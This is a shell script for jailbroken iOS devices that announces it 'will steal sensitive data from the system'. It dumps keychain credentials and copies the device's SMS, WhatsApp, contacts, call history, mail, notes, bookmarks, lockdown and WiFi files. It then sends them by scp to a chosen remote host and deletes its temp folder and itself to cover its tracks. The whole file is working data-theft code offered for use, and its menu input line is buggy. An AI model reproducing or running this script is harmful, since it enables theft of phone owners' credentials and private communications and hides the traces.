#!/bin/sh

# Declaring colours variable.
YELLOW="\033[1;33m"
RED="\033[0;31m"
GREEN="\e[0;32m"
ENDCOLOR="\033[0m"

# Clear the screen.
clear

# Copyright
echo "##############################"
echo "#                            #"
echo "#Created by br4in on 19/03/15#"
echo "#                            #"
echo "##############################"

# Warning, useless.
echo -e $RED"This script will steal sensitive data from the system."
echo -e $GREEN"At the end of the script, the dumped files will be sent via scp,"
echo -e $GREEN"The temporary folder will be deleted from the system,"
echo -e $GREEN"And the script will delete itself." 
echo -e $YELLOW"Use it at your own risk."$ENDCOLOR
sleep 5
clear

# Create a temporary folder to store the data
echo "Creating a temporary folder to store the data"
mkdir Dump_temporary
sleep 1
echo "Temporary folder created."
sleep 1
clear
sleep 1

# Creating menu

	echo "================================"
	echo "Menu"
	echo "================================"
	echo "Choose a database"
	echo "================================"
	echo
	echo "1) Credentials : "
	echo "2) SMS : "
	echo "3) Whatsapp : "
	echo "4) AddressBook : "
	echo "5) Call History : "
	echo "6) Emails : "
	echo "7) Notes : "
	echo "8) Safari Bookmarks : "
	echo "9) Favorites Contacts : "
	echo "10) Data_ark : "
	echo "11) Known WiFi Networks : "
	echo "12) Dump'em All : "
	echo "13) Send file : "
	echo "q) Quit : "
	echo "================================"
	echo -e "\n"
	echo -e "Enter your selection \c"
read $answer
case "$answer" in
	
	1) echo -e $GREEN"Starting keychain-dumper..."$ENDCOLOR
./keychain_dumper > credentials.txt 
mv credentials.txt Dump_temporary
echo "Credentials stored in file 'credentials.txt' inside the temporary folder"
sleep 3
clear ;;
	
	2) # Search for SMS database.
echo -e $GREEN"Looking for SMS database..."$ENDCOLOR
sleep 1
if [ -f /private/var/mobile/Library/SMS/sms.db ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/SMS/sms.db Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;
	
	3) # Search for WhatsApp database.
echo -e $GREEN"Looking for WhatsApp database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Containers/Shared/AppGroup/EBA8B490-3D74-43A3-8A5B-BF6140D1C2EF/ChatStorage.sqlite ]; then
    echo "Database found!"
    echo "Copying it to the temporary folder."
  cp /private/var/mobile/Containers/Shared/AppGroup/EBA8B490-3D74-43A3-8A5B-BF6140D1C2EF/ChatStorage.sqlite Dump_temporary
sleep 3
else
  echo "Database doesn't exist, skipping."
    fi
clear ;;

	4) # Search for AddressBook database
echo -e $GREEN"Looking for Contacts database..."$ENDCOLOR
sleep 1
if [ -f /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	5) # Search for Calls database
echo -e $GREEN"Looking for Calls History database..."$ENDCOLOR
sleep 1
if [ -f /private/var/wireless/Library/CallHistory/call_history.db ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/wireless/Library/CallHistory/call_history.db Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	6) # Search for Emails database
echo -e $GREEN"Looking for Emails database..."$ENDCOLOR
sleep 1
if [ -f /private/var/mobile/Library/Mail/Protected\ Index ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Mail/Protected\ Index Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	7) # Search for Notes database
echo -e $GREEN"Looking for Notes database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Library/Notes/notes.sqlite ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Notes/notes.sqlite Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	8) # Search for Safari Bookmarks
echo -e $GREEN"Looking for Safari Bookmarks database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Library/Safari/Bookmarks.db ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Safari/Bookmarks.db Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	9) # Search for Favorites Contacts database
echo -e $GREEN"Looking for Favorites Contacts database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	10) #  Search for data_ark file
echo -e $GREEN"Looking for data_ark file, contains useful info about the device."$ENDCOLOR
sleep 1 
if [ -f /private/var/root/Library/Lockdown/data_ark.plist ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/root/Library/Lockdown/data_ark.plist Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	11) # Search for known WiFi networks database
echo -e $GREEN"Looking for known WiFi networks database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/preferences/SystemConfiguration/com.apple.wifi.plist ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/preferences/SystemConfiguration/com.apple.wifi.plist Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	12) # Run keychain-dumper to get credentials.
echo -e $GREEN"Starting keychain-dumper..."$ENDCOLOR
./keychain_dumper > credentials.txt 
mv credentials.txt Dump_temporary
echo "Credentials stored in file 'credentials.txt' inside the temporary folder"
sleep 3
clear

# Search for SMS database.
echo -e $GREEN"Looking for SMS database..."$ENDCOLOR
sleep 1
if [ -f /private/var/mobile/Library/SMS/sms.db ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/SMS/sms.db Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

# Search for WhatsApp database.
echo -e $GREEN"Looking for WhatsApp database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Containers/Shared/AppGroup/EBA8B490-3D74-43A3-8A5B-BF6140D1C2EF/ChatStorage.sqlite ]; then
    echo "Database found!"
    echo "Copying it to the temporary folder."
  cp /private/var/mobile/Containers/Shared/AppGroup/EBA8B490-3D74-43A3-8A5B-BF6140D1C2EF/ChatStorage.sqlite Dump_temporary
sleep 3
else
  echo "Database doesn't exist, skipping."
    fi
clear

# Search for AddressBook database
echo -e $GREEN"Looking for Contacts database..."$ENDCOLOR
sleep 1
if [ -f /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/AddressBook/AddressBook.sqlitedb Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

# Search for Calls database
echo -e $GREEN"Looking for Calls History database..."$ENDCOLOR
sleep 1
if [ -f /private/var/wireless/Library/CallHistory/call_history.db ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/wireless/Library/CallHistory/call_history.db Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

# Search for Emails database
echo -e $GREEN"Looking for Emails database..."$ENDCOLOR
sleep 1
if [ -f /private/var/mobile/Library/Mail/Protected\ Index ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Mail/Protected\ Index Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

# Search for Notes database
echo -e $GREEN"Looking for Notes database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Library/Notes/notes.sqlite ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Notes/notes.sqlite Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

# Search for Safari Bookmarks
echo -e $GREEN"Looking for Safari Bookmarks database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Library/Safari/Bookmarks.db ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Safari/Bookmarks.db Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

# Search for Favorites Contacts database
echo -e $GREEN"Looking for Favorites Contacts database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

#  Search for data_ark file
echo -e $GREEN"Looking for data_ark file, contains useful info about the device."$ENDCOLOR
sleep 1 
if [ -f /private/var/root/Library/Lockdown/data_ark.plist ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/root/Library/Lockdown/data_ark.plist Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear

# Search for known WiFi networks database
echo -e $GREEN"Looking for known WiFi networks database..."$ENDCOLOR
sleep 1 
if [ -f /private/var/preferences/SystemConfiguration/com.apple.wifi.plist ]; then
    echo "Database found!"
   	echo "Copying it to the temporary folder."
	cp /private/var/preferences/SystemConfiguration/com.apple.wifi.plist Dump_temporary
sleep 3
else
	echo "Database doesn't exist, skipping."
   	fi
clear ;;

	13) # Dumping finished
echo -e $RED"Dumping completed."
echo

# Prepare to send files
echo -e $YELLOW"Preparing to send files..."$ENDCOLOR
echo 
echo -e $YELLOW"The files will be sent over scp..."$ENDCOLOR
echo -e $YELLOW"Please, type username : "$ENDCOLOR
read username
echo
echo -e $YELLOW"Please, type IP address :"$ENDCOLOR
read IP
echo
echo -e $RED"  $username@$IP   "$ENDCOLOR
echo
echo -e $GREEN"Transfering files over scp..."$ENDCOLOR
scp -r Dump_temporary $username@$IP:~
echo -e $YELLOW"Transfer completed!"$ENDCOLOR
sleep 2
clear

# Begin autoremoving
echo -e $RED"Deleting Dump_temporary folder..."$ENDCOLOR
rm -r Dump_temporary
echo
echo
ls
sleep 2
echo -e $RED"Folder deleted!"$ENDCOLOR
clear
echo -e $RED"Deleting the script..."$ENDCOLOR
rm dumper.sh
echo
echo
ls
echo -e $GREEN"Script completed, exiting!"$ENDCOLOR
clear
exit ;;

	q) exit ;;

esac


